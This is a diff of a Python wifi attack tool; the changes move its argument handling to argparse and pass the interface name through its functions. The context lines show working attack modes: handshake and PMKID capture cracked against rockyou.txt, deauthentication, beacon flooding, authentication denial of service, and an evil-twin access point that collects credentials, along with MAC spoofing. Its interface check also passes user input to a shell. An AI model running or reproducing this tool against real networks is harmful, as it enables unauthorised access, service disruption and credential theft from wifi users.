@@ -4,13 +4,19 @@ import os
 import subprocess
 import time
 import signal
+import argparse
+
+
+# Global Variable
+global netInterfaceName
 
 
 def ctrl_c(signum, frame):
+    print(netInterfaceName)
     get_colours("\n[!] Stopping attack...", "mangeta")
     get_colours("\n\n[!] Clearing Temporary files..", "red")
     get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
-    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "airmon-ng", "stop", netInterfaceName], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "yellow")
     os.system("rm -rf Cap*")
@@ -60,13 +66,13 @@ def get_colours(text, color):
 
 
 def menu_panel():
-    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -n <Network InterFace> "
-                                                                                              "-a <parameters>",
+    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -i <Network InterFace> "
+                                                                                              "-m <parameters>",
                 "green")
     get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
-    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-n]'}{Fore.YELLOW + ' Monitor mode interface'}")
+    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Monitor mode interface'}")
     print("")
-    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-a]'}{Fore.YELLOW + ' Attack mode'}")
+    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Attack mode'}")
     print("")
     get_colours(f"\t Handshake", "blue")
     get_colours(f"\t PKMID", "blue")
@@ -79,7 +85,7 @@ def menu_panel():
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
 
 
-def check_deps():
+def check_deps(interfaceName, attackMode):
     if os.getuid() != 0:
         script_banner()
         print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
@@ -99,7 +105,7 @@ def check_deps():
                                       text=True)
         if "Setting up mdk4" in install_mdk4.stdout:
             get_colours("\n[*] MDK4 Installed...", "blue")
-            check_deps() # Check for MDK4
+            check_deps(interfaceName, attackMode) # Check for MDK4
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -117,7 +123,7 @@ def check_deps():
                                          text=True)
         if "Setting up Hashcat" in install_hashcat.stdout:
             get_colours("\n[*] Hashcat Installed...", "blue")
-            check_deps() # Another Check for HASHCAT
+            check_deps(interfaceName, attackMode) # Another Check for HASHCAT
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -135,7 +141,7 @@ def check_deps():
                                             text=True)
         if "Setting up macchanger" in install_macchanger.stdout:
             get_colours("\n[*] Macchanger Installed...", "blue")
-            check_deps()
+            check_deps(interfaceName, attackMode)
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -153,7 +159,7 @@ def check_deps():
                                            text=True)
         if "Setting up airmon-ng" in install_airmon_ng.stdout:
             get_colours("\n[*] Airmon-ng Installed...", "blue")
-            check_deps()
+            check_deps(interfaceName, attackMode)
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -172,7 +178,7 @@ def check_deps():
         subprocess.run(["sudo", "apt", "install", "hcxtools"], stdout=subprocess.DEVNULL)
         if "Setting up hcxdumptool" in install_hcxdump.stdout:
             get_colours("\n[*] hcxdumpTool Installed...", "blue")
-            check_deps()
+            check_deps(interfaceName, attackMode)
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -200,7 +206,7 @@ def check_deps():
                                          text=True)
         if "Setting up dnsmasq" in install_dnsmasq.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
-            check_deps()
+            check_deps(interfaceName, attackMode)
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -218,7 +224,7 @@ def check_deps():
                                          text=True)
         if "Setting up hostapd" in install_hostapd.stdout:
             get_colours("\n[*] Dnsmasq Installed...", "blue")
-            check_deps()
+            check_deps(interfaceName, attackMode)
         else:
             get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                         f" programs manually: ", 'red')
@@ -227,7 +233,7 @@ def check_deps():
             exit()
 
     time.sleep(2)
-    attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
+    attack_func(interfaceName, attackMode)  # If all the necessary programs are installed then call the attack func.
     print(Fore.WHITE)
 
 
@@ -268,6 +274,7 @@ def getCredentials():
             initial_2fa = current_2fa
 
 
+# Attack Function
 def attack_func(network_interface, attack_mode):
     time.sleep(1)
     subprocess.run(["clear"])
@@ -287,6 +294,10 @@ def attack_func(network_interface, attack_mode):
             network_interface = network_interface + 'mon'
     except:
         pass
+
+    global netInterfaceName
+    netInterfaceName = network_interface
+
     subprocess.run(["sudo", "ifconfig", network_interface, "down"], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "macchanger", "-r", network_interface], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "ifconfig", network_interface, "up"], stdout=subprocess.DEVNULL)
@@ -345,7 +356,7 @@ def attack_func(network_interface, attack_mode):
         time.sleep(2)
         os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}-01.cap &")
         os.system('clear')
-        quit_program()
+        quit_program(network_interface)
     # PKMID Attack Mode
     elif attack_mode == "PKMID":
         subprocess.run(["clear"])
@@ -381,14 +392,14 @@ def attack_func(network_interface, attack_mode):
             os.system(f"xterm -hold -e hashcat -m 22000 -a 0 -w 4 myHashes_PKMID /usr/share/wordlists/rockyou.txt "
                       f"-d 1 --force &")
             os.system("clear")
-            quit_program()
+            quit_program(network_interface)
         else:
             os.system('clear')
             get_colours("\n[-] no hashes captured...", "red")
             time.sleep(2)
             os.system("rm -rf Cap*")
             os.system('clear')
-            quit_program()
+            quit_program(network_interface)
     # Deauthentication Attack Mode
     elif attack_mode == "DAuth":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
@@ -432,7 +443,7 @@ def attack_func(network_interface, attack_mode):
                 pid = int(line.split(None, 1)[0])
                 os.kill(pid, signal.SIGKILL)
         get_colours("\n\n\n[*] Attack completed successfully", 'green')
-        quit_program()
+        quit_program(network_interface)
     # Beacon Flood Attack Mode
     elif attack_mode == "BFlood":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
@@ -442,7 +453,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
             f"xterm -hold -e sudo mdk4 {network_interface} b -s 950")
-        quit_program()
+        quit_program(network_interface)
     # Authentication Denial-Of-Service
     elif attack_mode == "AAuth":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
@@ -459,7 +470,7 @@ def attack_func(network_interface, attack_mode):
         get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
         os.system(
             f"xterm -hold -e sudo mdk4 {network_interface} a -a {access_bssid}")
-        quit_program()
+        quit_program(network_interface)
     # Evil Twin Attack
     elif attack_mode == "ETwin":
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
@@ -512,16 +523,16 @@ def attack_func(network_interface, attack_mode):
         print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + ' Deleting temporary files..'}")
         os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
         get_colours("\n\n[*] Attack completed successfully", 'green')
-        quit_program()
+        quit_program(network_interface)
 
 
-def quit_program():
+def quit_program(interfaceName):
     time.sleep(2)
     get_colours("\n[!] Exiting the program...", "blue")
     # os.system("rm -rf Cap*")
     os.system('rm -rf wifi_hostapd.conf wifi_dnsmasq.conf')
     get_colours("\nSetting Network interface to it normal mode..", "mangeta")
-    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
+    subprocess.run(["sudo", "airmon-ng", "stop", interfaceName], stdout=subprocess.DEVNULL)
     subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
     get_colours("\n[*] Network set to it's normal mode...", "magenta")
     print(Fore.WHITE)
@@ -540,59 +551,41 @@ def attackModes():
     print(Fore.WHITE)
 
 
+
 def check_parms():
-    script_banner()
     if len(sys.argv) > 1:
-        if sys.argv[1] == "-h":
-            menu_panel()
-        elif sys.argv[1] == '-n':
-            if len(sys.argv) > 2:
-                if len(sys.argv) > 3:
-                    if sys.argv[3] == '-a':
-                        if len(sys.argv) > 4:
-                            check_interface_exist = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
-                                                                            " '%s' | awk '{print $1}' FS=':'" % (
-                                                                                sys.argv[2], sys.argv[2]),
-                                                                            shell=True).decode().strip()
-                            check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin", "AAuth"]
-                            if sys.argv[2] != check_interface_exist:
-                                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
-                                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
-                                save_all = get_inters.split('\n')
-                                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
-                                cnt = 1
-                                for i in save_all:
-                                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
-                                    cnt = cnt + 1
-                            elif sys.argv[4] not in check_attack_mode:
-                                attackModes()
-                            else:
-                                os.system('clear')
-                                check_deps()  # Check for necessary program to run this script.
-                        else:
-                            attackModes()
-                    else:
-                        print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                              f"{Fore.YELLOW + 'Missing the [-a] parameter.'}")
-                        print(Fore.WHITE)
-                else:
-                    attackModes()
-            else:
-                print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                      f"{Fore.YELLOW + 'Invalid Network Interface name'}")
-                get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
-                save_all = get_inters.split('\n')
-                print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
-                cnt = 1
-                for i in save_all:
-                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
-                    cnt = cnt + 1
-                print(Fore.WHITE)
-        else:
+        # Check for Arguments
+        parser = argparse.ArgumentParser()
+        parser.add_argument('-i', '--interface', type=str, required=True, help="Network Interface")
+        parser.add_argument('-m', '--mode', required=True,
+                            type=str,
+                            help='Attack Mode',
+                            )
+        args = parser.parse_args()
+        check_interface_exist = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
+                                                        " '%s' | awk '{print $1}' FS=':'" % (
+                                                            args.interface, args.interface),
+                                                        shell=True).decode().strip()
+        check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood", "ETwin", "AAuth"]
+        if args.mode not in check_attack_mode:
+            attackModes()
+        elif args.interface != check_interface_exist:
             print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
-                  f"{Fore.YELLOW + 'Missing the [-n] parameter.'}")
+                  f"{Fore.YELLOW + 'Invalid Network Interface name'}")
+            get_inters = subprocess.check_output("ls /sys/class/net", shell=True).decode().strip()
+            save_all = get_inters.split('\n')
+            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
+            cnt = 1
+            for i in save_all:
+                print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
+                cnt = cnt + 1
+        else:
+            os.system('clear')
+            global netInterfaceName
+            netInterfaceName = args.interface
+            check_deps(args.interface, args.mode)  # Check for necessary program to run this script.
     else:
+        script_banner()
         menu_panel()
 
 
